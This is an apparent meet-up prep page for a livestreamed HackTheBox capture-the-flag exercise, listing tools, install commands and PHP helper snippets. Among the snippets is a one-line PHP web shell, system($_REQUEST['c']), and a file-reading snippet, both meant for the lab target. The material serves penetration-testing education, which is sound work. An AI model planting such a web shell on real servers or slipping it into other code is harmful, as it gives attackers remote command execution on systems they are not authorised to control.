# Livestream - 20210128 - DC604 Meet-up

## Introduction

On today's meet-up we'll be looking at a Capture-the-Flag machine from [HackTheBox](https://www.hackthebox.eu/). We'll work through the same methodology that a penetration tester would use when approaching an target. Once finished, we will have root on the target machine as well as well-organized notes detailing our process that would form the basis of a report for the client.


## Requirements

Those participating are expected to have [Kali Linux](https://www.kali.org/) or [Parrot Linux](https://www.parrotsec.org/) installed as they have the tools we will be using today. On this particular machine there is actually a path for Windows users to follow and the required tools are linked below. However, due to time constraints we won't be able to provide much support if issues arise for those on Windows.

**A word of caution**: although you can connect to HackTheBox from Windows directly it is strongly recommended to connect via a VM. The target environment is shared between many users so there is the potential for other users to be able to connect back to your computer.

A HackTheBox account is also required and should be set up before we begin. It is not a simple sign-up as you actually have to "hack" the website invitation system before you get a link, so give yourself a little time. You **do not** need a paid account for this livestream.

It is also expected to have some familiarity with the command line as the tools we are using do not have GUIs.


## Tools

**Linux**
- Firefox or Chrome - *preinstalled on Kali/Parrot*
- Gobuster - *preinstalled or available on Kali/Parrot*
- Weevely (optional, but highly recommended) - *preinstalled on Kali*
- SSH - *preinstalled in most Linux distros*
- [Ghidra](https://ghidra-sre.org/) (optional, but highly recommended) - [download](https://ghidra-sre.org/ghidra_9.2.2_PUBLIC_20201229.zip) *300MB* - *will require Java*

If Gobuster is not installed, install it through apt
```
sudo apt update
sudo apt install gobuster
```

If you do not have the JDK installed and will be using Ghidra, install the JDK as well (just over 200MB)
```
sudo apt update
sudo apt install default-jdk
```

**Windows**
- Firefox or Chrome
- [7-zip](https://www.7-zip.org/) for .tar and .gz - [64-bit download](https://www.7-zip.org/a/7z1900-x64.exe)
- [PuTTY and PuTTYgen](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) - [64-bit PuTTY](https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe) - [64-bit PuTTYgen](https://the.earth.li/~sgtatham/putty/latest/w64/puttygen.exe)
- [Gobuster](https://github.com/OJ/gobuster/releases/tag/v3.1.0) - [64-bit download](https://github.com/OJ/gobuster/releases/download/v3.1.0/gobuster-windows-amd64.7z)
- [Ghidra](https://ghidra-sre.org/) (optional, but highly recommended) - [download](https://ghidra-sre.org/ghidra_9.2.2_PUBLIC_20201229.zip) *300MB* - *will require Java*

You should also have an SSH key generated for PuTTY and the RSA public key ready to use. [Instructions here](https://www.ssh.com/ssh/putty/windows/puttygen). **Do not use a passphrase for meet-up**.

If you do not have the JDK installed, [you can follow these instructions](https://ghidra-sre.org/InstallationGuide.html#Requirements). However, I believe you'll most likely be using the [64-bit OpenJDK 11/Hotspot](https://github.com/AdoptOpenJDK/openjdk11-binaries/releases/download/jdk-11.0.10%2B9/OpenJDK11U-jdk_x64_windows_hotspot_11.0.10_9.msi). *note, I did not test this personally*


## Code Examples

If you're not able to or prefer not to use `weevely` then you will need some or all of the following code snippets.

**Display "Hello"**
```php
<?php echo 'Hello'; ?>
```

**Run a shell command and display the results**
```php
<?php system($_REQUEST['c']); ?>
```
*Access via http://target/script.php?c=command*

**Display PHP info**
```php
<?php phpinfo(); ?>
```

**Display file contents**
```php
<?php readfile('/path/to/file.txt'); ?>
```

**Run a MySQL database query**
```php
<?php
$conn = new mysqli('hostname', 'username', 'password', 'database');
$result = $conn->query('SELECT 1234');
while ($row = $result->fetch_assoc())
	print_r($row);
$conn->close();
?>
```







